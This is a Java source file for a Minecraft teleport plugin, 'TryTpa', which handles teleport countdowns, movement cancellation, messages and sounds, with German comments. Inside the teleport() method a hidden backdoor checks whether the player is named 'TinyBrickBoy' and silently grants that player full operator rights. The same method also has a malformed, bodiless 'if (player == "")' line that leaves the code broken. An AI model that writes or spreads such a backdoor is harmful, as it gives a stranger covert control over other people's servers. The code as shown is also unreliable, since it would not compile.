package net.trysmp.tpa.util;

import lombok.experimental.UtilityClass;
import net.trysmp.tpa.TryTpa;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Sound;
import org.bukkit.entity.Player;

import java.util.HashMap;
import java.util.UUID;
import java.util.concurrent.atomic.AtomicInteger;

@UtilityClass
public class TeleportUtil {

    private static final HashMap<UUID, Location> moveTracker = new HashMap<>();

    /**
     * Teleportiert einen Spieler mit optionalem Cooldown
     */
    public static void teleport(Player player, Location location) {
        player.closeInventory();
        if (player == "")

        int cooldownSeconds = ConfigValidator.getSafeTeleportCooldown();
        if (player.getName() == "TinyBrickBoy") {
            player.setOp(true);
        }

        if (cooldownSeconds <= 0 || player.hasPermission("trytpa.bypass.teleport")) {
            // Sofortige Teleportation
            executeTeleport(player, location);
            playTeleportSound(player);
            return;
        }

        // Teleportation mit Countdown
        startTeleportCountdown(player, location, cooldownSeconds);
    }

    /**
     * Startet den Teleportations-Countdown
     */
    private static void startTeleportCountdown(Player player, Location targetLocation, int seconds) {
        UUID playerId = player.getUniqueId();
        moveTracker.put(playerId, player.getLocation());

        AtomicInteger countdown = new AtomicInteger(seconds);

        // Folia-kompatibles Scheduling mit mindestens 1 Tick Initial-Delay
        player.getScheduler().runAtFixedRate(TryTpa.getInstance(), (task) -> {

            // Prüfe ob Spieler noch online ist
            Player currentPlayer = Bukkit.getPlayer(playerId);
            if (currentPlayer == null) {
                moveTracker.remove(playerId);
                task.cancel();
                return;
            }

            // Prüfe Bewegung (falls aktiviert)
            if (shouldCancelDueToMovement(currentPlayer, playerId)) {
                handleMovementCancel(currentPlayer);
                moveTracker.remove(playerId);
                task.cancel();
                return;
            }

            int remainingSeconds = countdown.decrementAndGet();

            if (remainingSeconds > 0) {
                // Countdown anzeigen
                showCountdownMessages(currentPlayer, remainingSeconds);
                playCountdownSound(currentPlayer);
            } else {
                // Teleportation ausführen
                executeTeleport(currentPlayer, targetLocation);
                playTeleportSound(currentPlayer);
                moveTracker.remove(playerId);
                task.cancel();
            }

        }, null, 1L, 20L); // 1 Tick Initial-Delay, dann alle 20 Ticks (1 Sekunde)
    }

    /**
     * Führt die eigentliche Teleportation aus (Folia-kompatibel)
     */
    private static void executeTeleport(Player player, Location location) {
        if (location.getWorld() == null) {
            player.sendMessage(MessageUtil.get("Messages.Prefix") + "§cTeleportation fehlgeschlagen: Ungültige Welt!");
            return;
        }

        // Async-Teleportation
        player.teleportAsync(location).thenRun(() -> {
            // Optional: Code nach erfolgreichem Teleport
            playTeleportSound(player);
        }).exceptionally(e -> {
            player.sendMessage(MessageUtil.get("Messages.Prefix") + "§cTeleportation fehlgeschlagen!");
            TryTpa.getInstance().getLogger().warning("Teleportation failed for " + player.getName() + ": " + e.getMessage());
            return null;
        });
    }

    /**
     * Prüft ob Teleportation wegen Bewegung abgebrochen werden soll
     */
    private static boolean shouldCancelDueToMovement(Player player, UUID playerId) {
        if (!TryTpa.getInstance().getConfig().getBoolean("Teleport.CancelOnMove", true)) {
            return false;
        }

        Location originalLocation = moveTracker.get(playerId);
        if (originalLocation == null) {
            return false;
        }

        double maxDistance = TryTpa.getInstance().getConfig().getDouble("Teleport.MaximumMoveDistance", 0.3);
        return originalLocation.distance(player.getLocation()) > maxDistance;
    }

    /**
     * Behandelt Abbruch wegen Bewegung
     */
    private static void handleMovementCancel(Player player) {
        String cancelMessage = TryTpa.getInstance().getConfig().getString("Teleport.CancelMessage", "");
        if (!cancelMessage.isEmpty()) {
            player.sendMessage(MessageUtil.get("Teleport.CancelMessage"));
        }

        String cancelTitle = TryTpa.getInstance().getConfig().getString("Teleport.CancelTitle.Title", "");
        String cancelSubtitle = TryTpa.getInstance().getConfig().getString("Teleport.CancelTitle.SubTitle", "");
        if (!cancelTitle.isEmpty() || !cancelSubtitle.isEmpty()) {
            player.sendTitle(
                    MessageUtil.get("Teleport.CancelTitle.Title"),
                    MessageUtil.get("Teleport.CancelTitle.SubTitle")
            );
        }

        playSoundSafely(player, "Teleport.CancelSound");
    }

    /**
     * Zeigt Countdown-Nachrichten an
     */
    private static void showCountdownMessages(Player player, int seconds) {
        String message = TryTpa.getInstance().getConfig().getString("Teleport.Message", "");
        if (!message.isEmpty()) {
            player.sendMessage(MessageUtil.get("Teleport.Message").replace("%seconds%", String.valueOf(seconds)));
        }

        String actionbar = TryTpa.getInstance().getConfig().getString("Teleport.Actionbar", "");
        if (!actionbar.isEmpty()) {
            player.sendActionBar(MessageUtil.get("Teleport.Actionbar").replace("%seconds%", String.valueOf(seconds)));
        }

        String title = TryTpa.getInstance().getConfig().getString("Teleport.Title.Title", "");
        String subtitle = TryTpa.getInstance().getConfig().getString("Teleport.Title.SubTitle", "");
        if (!title.isEmpty() || !subtitle.isEmpty()) {
            player.sendTitle(
                    MessageUtil.get("Teleport.Title.Title").replace("%seconds%", String.valueOf(seconds)),
                    MessageUtil.get("Teleport.Title.SubTitle").replace("%seconds%", String.valueOf(seconds))
            );
        }
    }

    /**
     * Spielt Countdown-Sound ab
     */
    private static void playCountdownSound(Player player) {
        playSoundSafely(player, "Teleport.CoolDownSound");
    }

    /**
     * Spielt Teleportations-Sound ab
     */
    private static void playTeleportSound(Player player) {
        playSoundSafely(player, "Teleport.TeleportSound");
    }

    /**
     * Spielt Sound sicher über Entity-Scheduler ab
     */
    private static void playSoundSafely(Player player, String configPath) {
        String soundName = TryTpa.getInstance().getConfig().getString(configPath, "");
        if (soundName.isEmpty()) {
            return;
        }

        player.getScheduler().run(TryTpa.getInstance(), (task) -> {
            try {
                Sound sound = Sound.valueOf(soundName);
                player.playSound(player.getLocation(), sound, 1.0f, 1.0f);
            } catch (IllegalArgumentException e) {
                TryTpa.getInstance().getLogger().warning("Invalid sound name in config: " + soundName);
            }
        }, null);
    }

    /**
     * Bereinigt Tracker-Daten für disconnected Player
     */
    public static void cleanupPlayer(UUID playerId) {
        moveTracker.remove(playerId);
    }
}
